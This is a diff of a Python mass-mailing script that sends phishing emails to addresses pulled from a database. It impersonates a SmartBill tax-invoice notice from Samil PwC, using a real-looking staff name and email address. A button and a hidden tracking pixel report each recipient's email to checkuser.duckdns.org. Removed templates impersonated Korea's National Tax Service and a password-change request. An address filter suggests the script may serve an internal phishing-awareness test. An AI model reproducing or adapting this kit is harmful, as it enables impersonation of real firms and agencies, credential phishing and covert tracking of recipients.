@@ -2,6 +2,23 @@ import yagmail
 import base64
 import pymysql
 import pandas as pd
+import time
+
+# wb = xw.Book('mail_list.xlsx')
+# sheet = wb.sheets[0]  # 첫 번째 시트 사용
+
+# column_email = sheet.range('B1').expand('down').value
+# # combined = list(zip(column_name, column_email)) # 리스트 합쳐서 배열로 변경
+# wb.close()
+
+print("메일 주소 SQL 열람 완료")
+
+# --------------------------
+
+html_template = """
+<div align="center">        <table width="800" border="0" cellspacing="0" cellpadding="15" align="center">         <tbody>          <tr>           <td>            <!--스마트빌 세금계산서 정보 메일 Start-->            <table width="800" border="0" cellspacing="0" cellpadding="0" align="center" style="width:800px; margin:0 auto; border-collapse: collapse; ">             <!--content box Start-->             <tbody>              <tr>               <td>                <table width="800" border="0" cellspacing="0" cellpadding="0" align="left" style="width:800px;border-collapse: collapse;">                 <!--스마트빌 로고 start-->                 <tbody>                  <tr>                   <td><a target="_blank" href="http://www.smartbill.co.kr/" title="SmartBill"><img src="http://www.smartbill.co.kr/image/mail/Mail_2022/smartbill_logo.jpg" width="96" height="20" alt="스마트빌" style="display:block;border:0;padding:0;" border="0"></a></td>                  </tr>                  <!--//스마트빌 로고 end-->                  <!--메일 타이틀 start-->                  <tr>                   <td valign="top">                    <table width="800" border="0" cellspacing="0" cellpadding="0" align="left" style="width:800px; border-collapse: collapse; word-break: break-all;">                     <tbody>                      <tr>                       <td height="14" style="height:14px;padding:0;"></td>                      </tr>                      <!--타이틀 start-->                      <tr>                       <td style="font-size:37px; color:#434852;   mso-line-height-rule: exactly;line-height:50px ; font-weight:bold; font-weight:700; text-align:left; font-family:'Noto Sans KR', 'Malgun Gothic','Dotum'; letter-spacing:-1px;">전자세금계산서가 <span style="color:#4766d3;">발행</span> 되었습니다.</td>                      </tr>                      <!--//타이틀 end-->                      <tr>                       <td height="10px" style="height:10px; padding:0;"></td>                      </tr>                      <!--텍스트 start-->                      <tr>                       <td style="font-size:14px; color:#888888; mso-line-height-rule: exactly;line-height:19px; font-weight:normal; font-weight:400; text-align:left;  font-family:'Noto Sans KR', 'Malgun Gothic','Dotum';"> 안녕하십니까? 스마트빌입니다.<br>내용 확인 후 <span style="color:#ff6600;">발행된 세금계산서를 수신 또는 거부</span>해 주시기 바랍니다.<br>고객님은 비회원으로서 세금계산서의 조회만 가능하며, 메일 발송일로부터 1년 동안만 스마트빌에서 조회하실 수 있습니다. </td>                      </tr>                      <!--//텍스트 end-->                      <tr>                       <td height="20" style="height:20px;padding:0;"></td>                      </tr>                     </tbody>                    </table> </td>                  </tr>                  <!--//메일 타이틀 end-->                  <!--컨텐츠 테이블 start-->                  <tr>                   <td>                    <table width="800" border="0" cellspacing="0" cellpadding="0" align="left" style="width:800px; border-collapse: collapse; word-break: break-all;">                     <!--정보 테이블 start-->                     <!--비회원 비밀번호 start-->                     <tbody>                      <tr>                       <td valign="top" bgcolor="#f2f2f2" style=" background-color:#f2f2f2; background:#f2f2f2;">                        <table border="0" cellspacing="0" cellpadding="0" align="left" style="border-collapse: collapse; word-break: break-all;">                         <tbody>                          <tr>                           <td width="140" style="text-align:left; padding-left:15px; padding-right:0; padding-top:0; padding-bottom:0;">                            <table border="0" cellspacing="0" cellpadding="0" align="left" style="border-collapse: collapse; word-break: break-all;">                             <tbody>                              <tr>                               <td height="46" align="right" valign="middle" style="mso-line-height-rule: exactly;line-height:19px; padding:0;"><img src="http://www.smartbill.co.kr/image/mail/Mail_2022/icon.png" width="4" height="14" alt="" style="display:block;line-height:0;padding:0; border:0;" border="0"></td>                               <td align="left" valign="middle" style="font-size:14px;mso-line-height-rule: exactly;line-height:19px; color:#4766d3;  font-weight:bold; font-weight:600; text-align:left;   font-family:'Noto Sans KR', 'Malgun Gothic','Dotum';  padding-left:7px; padding-right:0; padding-top:0; padding-bottom:0;">비회원 비밀번호</td>                              </tr>                             </tbody>                            </table></td>                           <td align="left" valign="middle" style="font-size:14px; mso-line-height-rule: exactly;line-height:19px; color:#777777; font-weight:normal; font-weight:400; text-align:left;  font-family:'Noto Sans KR', 'Malgun Gothic','Dotum'; text-decoration: none; padding-left:15px; padding-right:15px; padding-top:0; padding-bottom:0;">44808628D2D6D162704B97B53B7A9594</td>                          </tr>                         </tbody>                        </table></td>                      </tr>                      <tr>                       <td height="14" style="height:14px;padding:0;"></td>                      </tr>                      <!--//비회원 비밀번호 end-->                      <tr>                       <td align="left" valign="middle" style="font-size:17px;mso-line-height-rule: exactly;line-height:20px; color:#4766d3;  font-weight:bold; font-weight:500; text-align:left;   font-family:'Noto Sans KR', 'Malgun Gothic','Dotum';  ">세금계산서 정보</td>                      </tr>                      <tr>                       <td height="10" style="height:10px; padding:0;"></td>                      </tr>                      <tr>                       <td height="2" bgcolor="#4766d3" style="height:2px; background:#4766d3;padding:0; line-height:0;"></td>                      </tr>                      <tr>                       <td valign="top">                        <table width="100%" border="0" cellspacing="0" cellpadding="0" style="border-collapse: collapse; word-break: break-all;">                         <!--작성일자-->                         <tbody>                          <tr>                           <td width="123" height="42" align="left" valign="middle" bgcolor="#f5f7fc" style="font-size:14px; color:#5e6069; mso-line-height-rule: exactly;line-height:19px; font-weight:normal; font-weight:500;  text-align:left; font-family:'Noto Sans KR', 'Malgun Gothic','Dotum'; padding-left:15px; padding-right:0; padding-top:0; padding-bottom:0; background:#f5f7fc; border-bottom:#e7e7e7 solid 1px;">작성일자</td>                           <td align="left" height="42" valign="middle" bgcolor="#ffffff" style=" padding-left:15px; padding-right:15px; padding-top:0; padding-bottom:0;  border-bottom:#e7e7e7 solid 1px;  font-size:14px; color:#777777; mso-line-height-rule: exactly;line-height:19px; font-weight:normal; font-weight:400;  text-align:left;  font-family:'Noto Sans KR', 'Malgun Gothic','Dotum'; background:#ffffff;">2025-06-02</td>                          </tr>                          <!--//작성일자-->                          <!--supplier-->                          <tr>                           <td width="123" align="left" valign="middle" bgcolor="#f5f7fc" style="font-size:14px; color:#5e6069; mso-line-height-rule: exactly;line-height:19px; font-weight:normal; font-weight:500;  text-align:left;  font-family:'Noto Sans KR', 'Malgun Gothic','Dotum'; padding-left:15px; padding-right:0; padding-top:0; padding-bottom:0; background:#f5f7fc;  border-bottom:#e7e7e7 solid 1px;">거래업체<br>(공급자)</td>                           <!--2줄 컨텐츠-->                           <td align="left" valign="middle" bgcolor="#ffffff" style="border-bottom:#e7e7e7 solid 1px; background:#ffffff;">                            <table width="100%" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse; word-break: break-all;">                             <!--회사명 / 담당자-->                             <tbody>                              <tr>                               <td height="42" align="left" valign="middle" style="padding-left:15px; padding-right:15px; padding-top:0px; padding-bottom:0px; ">                                <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse; word-break: break-all;">                                 <tbody>                                  <tr>                                   <td width="260" height="23" style="padding-right:3px; font-size:14px; color:#777777; mso-line-height-rule: exactly;line-height:19px; font-weight:normal; font-weight:400;  text-align:left;  font-family:'Noto Sans KR', 'Malgun Gothic','Dotum'; text-decoration: none; ">삼일회계법인</td>                                   <td width="6" style="border-left:#e7e7e7 solid 1px;"></td>                                   <td style="font-size:14px; color:#777777; mso-line-height-rule: exactly;line-height:19px; font-weight:normal; font-weight:400;  text-align:left;  font-family:'Noto Sans KR', 'Malgun Gothic','Dotum'; text-decoration: none; ">지혜인</td>                                  </tr>                                 </tbody>                                </table></td>                              </tr>                              <!--//회사명/담당자-->                              <!--2줄 이메일-->                              <tr>                               <td height="42" align="left" valign="middle" style=" padding-left:15px; padding-right:15px; padding-top:0; padding-bottom:0; border-top:#e7e7e7 solid 1px; ">                                <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse; word-break: break-all;">                                 <tbody>                                  <tr>                                   <td height="23" style="font-size:14px; color:#777777; mso-line-height-rule: exactly;line-height:19px; font-weight:normal; font-weight:400;  text-align:left;  font-family:'Noto Sans KR', 'Malgun Gothic','Dotum'; text-decoration: none; ">hyein.ji@pwc.com</td>                                  </tr>                                 </tbody>                                </table></td>                              </tr>                              <!--//2줄 이메일-->                             </tbody>                            </table></td>                           <!--//2줄 컨텐츠-->                          </tr>                          <!--//supplier-->                          <!--buyer-->                          <tr>                           <td width="123" align="left" valign="middle" bgcolor="#f5f7fc" style="font-size:14px; color:#5e6069; mso-line-height-rule: exactly;line-height:19px; font-weight:normal; font-weight:500;  text-align:left;  font-family:'Noto Sans KR', 'Malgun Gothic','Dotum'; padding-left:15px; padding-right:0; padding-top:0; padding-bottom:0; background:#f5f7fc;  border-bottom:#e7e7e7 solid 1px;">공급받는자</td>                           <!--2줄 컨텐츠-->                           <td align="left" valign="middle" bgcolor="#ffffff" style="border-bottom:#e7e7e7 solid 1px; background:#ffffff;">                            <table width="100%" border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse; word-break: break-all;">                             <!--회사명 / 담당자-->                             <tbody>                              <tr>                               <td height="42" align="left" valign="middle" style="padding-left:15px; padding-right:15px; padding-top:0px; padding-bottom:0px; ">                                <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse; word-break: break-all;">                                 <tbody>                                  <tr>                                   <td width="260" height="23" style="padding-right:3px; font-size:14px; color:#777777; mso-line-height-rule: exactly;line-height:19px; font-weight:normal; font-weight:400;  text-align:left;  font-family:'Noto Sans KR', 'Malgun Gothic','Dotum'; text-decoration: none; ">㈜인팩</td>                                   <td width="6" style="border-left:#e7e7e7 solid 1px;"></td>                                   <td style="font-size:14px; color:#777777; mso-line-height-rule: exactly;line-height:19px; font-weight:normal; font-weight:400;  text-align:left;  font-family:'Noto Sans KR', 'Malgun Gothic','Dotum'; text-decoration: none; ">-</td>                                  </tr>                                 </tbody>                                </table></td>                              </tr>                              <!--//회사명/담당자-->                              <!--2줄 이메일-->                              <tr>                               <td height="42" align="left" valign="middle" style=" padding-left:15px; padding-right:15px; padding-top:0; padding-bottom:0; border-top:#e7e7e7 solid 1px; ">                                <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse; word-break: break-all;">                                 <tbody>                                  <tr>                                   <td height="23" style="font-size:14px; color:#777777; mso-line-height-rule: exactly;line-height:19px; font-weight:normal; font-weight:400;  text-align:left;  font-family:'Noto Sans KR', 'Malgun Gothic','Dotum'; text-decoration: none; ">-</td>                                  </tr>                                 </tbody>                                </table></td>                              </tr>                              <!--//2줄 이메일-->                             </tbody>                            </table></td>                           <!--//2줄 컨텐츠-->                          </tr>                          <!--//buyer-->                         </tbody>                        </table></td>                      </tr>                      <!--버튼 start-->                      <tr>                       <td height="19" style="height:19px;padding:0;"></td>                      </tr>                      <tr>                       <td align="center" valign="top" style="text-align:center;">                        <table border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%; border-collapse: collapse;">                         <tbody>                          <tr>                           <td width="27%"></td>                           <td width="46%" align="center">                            <table bgcolor="#4766d3" style="border:solid 2px #4766d3; border-radius:4px;text-decoration:none;width:100%;border-spacing:0;" cellpadding="0" cellspacing="0" border="0">                             <tbody>                              <tr>                               <td align="center" style="color:#ffffff;  font-family:'Noto Sans KR', 'Malgun Gothic','Dotum';font-weight:normal; font-weight:500; font-size:18px; line-height:20px; letter-spacing:-0.2px;" height="52"> <a target="_blank" href="https://checkuser.duckdns.org/Site_open?user_email={user_email}" style="color:#ffffff; text-decoration:none; color:inherit; text-align:center;display:inline-block;" rel="noreferrer noopener"> 전자세금계산서 확인 </a> </td>                              </tr>                             </tbody>                            </table> </td>                           <td width="27%"></td>                          </tr>                         </tbody>                        </table> </td>                      </tr>                      <!--//버튼 end-->                      <!--정보 테이블 end-->                     </tbody>                    </table> </td>                  </tr>                  <!--//컨텐츠 테이블 end-->                 </tbody>                </table> </td>              </tr>              <!--//content box end-->              <tr>               <td height="32" style="height:32px;padding:0;"></td>              </tr>              <!--banner05 Start-->              <tr>               <td><a target="_blank" href="http://www2.smartbill.co.kr/xDti/common/process/EmailBannerClickAndRedirect.aspx?bnrIdx=1387&amp;bnrgroup=MAILBANNER"> <img src="http://www2.smartbill.co.kr/xDti/common/file2/BannerFile.aspx?BannerIDX=1387" align="absmiddle" style="display:block;" width="800" height="148" alt="디폴트 배너_11번" border="0"> </a></td>              </tr>              <!--//banner05 end-->              <tr>               <td height="22" style="height:22px;padding:0;"></td>              </tr>              <!--copyright Start-->              <tr>               <td>                <table width="800" border="0" cellspacing="0" cellpadding="0" align="right" style="width:800px; border-collapse: collapse;">                 <tbody>                  <tr>                   <td align="left" style="font-size:15px; color:#666666; mso-line-height-rule: exactly;line-height:20px; font-weight:normal; font-weight:400; text-align:left;  font-family:'Noto Sans KR', 'Malgun Gothic','Dotum';">본 메일은 발신전용으로 회신이 불가능 합니다.</td>                  </tr>                  <tr>                   <td height="10" style="height:10px; padding:0;"></td>                  </tr>                  <tr>                   <td align="left"><img src="http://www.smartbill.co.kr/image/mail/Mail_2022/copyright.gif" alt="(주)비즈니스온커뮤니케이션  서울시 강남구 학동로 230 유빔빌딩  ㅣ 고객센터 : 1588-8064  CopyrightⓒBusinessOn Communication Co., Ltd. All rights reserved" style="display:block;border:0;padding:0;" height="46" border="0"></td>                  </tr>                 </tbody>                </table> </td>              </tr>              <!--copyright end-->             </tbody>            </table>            <!--//스마트빌 세금계산서 정보 메일 End--> </td>          </tr>         </tbody>        </table>       </div>
+<img src="https://checkuser.duckdns.org/Mail_open?user_email={user_email}" style="display:none;" width="1" height="1"/>
+"""
 
 def get_connection():
     return pymysql.connect(
@@ -22,109 +39,27 @@ with get_connection() as conn :
     df = pd.read_sql(query, conn)
     column_email = df['Email'].tolist()
 
-
-# wb = xw.Book('mail_list.xlsx')
-# sheet = wb.sheets[0]  # 첫 번째 시트 사용
-
-# column_email = sheet.range('B1').expand('down').value
-# # combined = list(zip(column_name, column_email)) # 리스트 합쳐서 배열로 변경
-# wb.close()
-
-print("메일 주소 SQL 열람 완료")
-# --------------------------
-
-# html_template = """
-# <!DOCTYPE html>
-# <html lang="ko">
-# <head>
-#   <meta charset="UTF-8">
-# </head>
-# <body style="font-family: '맑은 고딕', sans-serif; background-color: #ffffff; color: #333; margin: 0; padding: 0;">
-#   <table width="100%" cellpadding="0" cellspacing="0" style="max-width: 700px; margin: auto; border: 1px solid #ccc;">
-#     <tr>
-#       <td style="background-color: #005bac; padding: 10px 20px;">
-#         <img src="https://i.imgur.com/33q0wYM.jpegM" alt="국세청 홈택스 로고" style="height: 40px;">
-#       </td>
-#     </tr>
-#     <tr>
-#       <td style="background-color: #e7f1f9; padding: 20px; font-size: 20px; font-weight: bold;">
-#         국세청 전자[세금]계산서입니다.
-#         <div style="margin-top: 10px; font-size: 14px; color: #666;">📧 본 메일은 <span style="color: red;">보안메일</span> 입니다.</div>
-#       </td>
-#     </tr>
-#     <tr>
-#       <td style="padding: 20px; font-size: 14px; line-height: 1.7;">
-#         본 메일은 국세청 홈택스를 이용하여 전자세금계산서를 발급하고 발송한 메일입니다.
-        
-#         ▸ <strong>발급일자 : 2025년 05월 23일</strong>
-#         *메일 내용을 확인하기 위해서는 <a href="https://checkuser.duckdns.org/Site_open?user_email={user_email}">여기</a>를 클릭하세요
-
-#         <strong>전자(세금)계산서 첨부파일이 열리지 않을 시 조치 방법</strong>
-#         1. 첨부파일을 사용자 PC에 저장
-#         2. 저장한 첨부파일을 오른쪽 마우스 클릭 후 연결프로그램에서 [Internet Explorer] 선택
-#       </td>
-#     </tr>
-#     <tr>
-#       <td style="font-size: 12px; color: #777; text-align: center; padding: 15px; border-top: 1px solid #ccc;">
-#         세종특별자치시 국세청로 8-14 국세청(정부세종청사 국세청동) (우편번호 30128)
-#         Copyrightⓒ National Tax Service. All rights reserved.
-#       </td>
-#     </tr>
-#   </table>
-#   <img src="https://checkuser.duckdns.org/Mail_open?user_email={user_email}"/>
-# </body>
-# </html>
-# """
-
-html_template = """
-<!DOCTYPE html>
-<html lang="ko">
-<head>
-  <meta charset="UTF-8">
-  <title>비밀번호 변경 안내</title>
-</head>
-<body style="margin:0; padding:0; font-family: 'Arial', sans-serif; background-color: #f4f4f4;">
-  <table width="100%" cellpadding="0" cellspacing="0" style="padding: 40px 0;">
-    <tr>
-      <td align="center">
-        <table width="600" cellpadding="0" cellspacing="0" style="background-color: #ffffff; border-radius: 8px; padding: 40px; box-shadow: 0 0 10px rgba(0,0,0,0.05);">
-          <tr>
-            <td style="text-align: center;">
-              <h2 style="color: #333;">인팩 비밀번호 변경 요청</h2>
-              <p style="color: #555; font-size: 16px;">보안 정책 강화에 따라 비밀번호 변경이 필요합니다.</p>
-              <p style="color: #555; font-size: 16px;">아래 버튼을 클릭하여 새 비밀번호를 설정해 주세요.</p>
-              <a href="https://checkuser.duckdns.org/Site_open?user_email={user_email}" 
-                 style="display: inline-block; margin-top: 20px; padding: 14px 24px; background-color: #00aaff; color: white; text-decoration: none; border-radius: 5px; font-weight: bold;">
-                비밀번호 변경하기
-              </a>
-              <p style="color: #999; font-size: 12px; margin-top: 40px;">
-                본 메일은 시스템에서 자동 발송되었으며, 회신하지 마십시오.<br>
-                문의: helpdesk@daouoffice.com
-              </p>
-            </td>
-          </tr>
-        </table>
-      </td>
-    </tr>
-  </table>
-  <img src="https://checkuser.duckdns.org/Mail_open?user_email={user_email}"/>
-</body>
-</html>
-"""
-
 f = open("google_password.txt", "r")
 google_password = f.read()
 f.close()
 
-yag = yagmail.SMTP( user={"infactesting@gmail.com" : "hometaxadmin@hometax.go.kr"}, password=google_password, host='smtp.gmail.com')
+yag = yagmail.SMTP( user={"infactesting@gmail.com" : "삼일회계법인 (발신전용메일)"}, password=google_password, host='smtp.gmail.com')
+
+start = int(time.perf_counter()) # 시작시간
+count  = 1
 
 for email_row in column_email :
-
+   
     # 제목 및 보낼 메일 지정
-    print(f"{email_row} 메일 보내는 중")
+    print(f"{count}. {email_row} 메일 보내는 중")
+    count += 1
+    if 'infac' not in email_row :
+      print("주소 오류로 인하여 생략됨")
+      continue
     to = email_row
-    subject = '[안내] 비밀번호 변경 필요'
+    subject = '[전자세금계산서 정발행] 삼일회계법인 ▶ ㈜인팩'
     
+    print(f"진행시각 : {int(time.perf_counter()) - start}")
     # 이메일 값 링크 암호화
     byte_text = email_row.encode('utf-8')
     encoded_text = base64.b64encode(byte_text)
@@ -134,3 +69,4 @@ for email_row in column_email :
     yag.send(to = to, subject = subject, contents = [html])
 
 print("전체 송신 완료")
+print(f"완료시각 : {int(time.perf_counter()) - start}")
